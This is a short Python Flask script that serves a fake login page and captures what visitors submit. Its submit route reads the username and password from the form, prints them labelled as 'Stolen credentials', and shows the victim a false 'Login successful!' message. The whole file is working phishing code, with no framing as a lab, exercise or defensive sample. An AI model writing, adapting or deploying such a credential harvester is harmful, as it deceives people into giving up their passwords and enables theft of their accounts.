from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/')
def home():
    return render_template_string(open('fake_login.html').read())

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form['username']
    password = request.form['password']
    print(f"Stolen credentials: {username}, {password}")
    return "Login successful!"

if __name__ == '__main__':
    app.run(debug=True)
